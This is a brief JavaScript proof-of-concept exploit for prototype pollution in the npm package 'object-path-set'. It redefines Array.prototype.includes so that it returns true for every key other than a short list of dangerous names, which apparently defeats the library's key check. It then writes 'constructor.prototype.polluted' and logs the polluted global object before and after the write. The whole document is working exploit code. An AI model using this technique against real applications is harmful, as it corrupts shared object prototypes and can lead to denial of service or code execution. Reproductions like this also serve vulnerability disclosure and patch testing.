Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const setPath = require('object-path-set');
console.log({}.polluted);
setPath({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);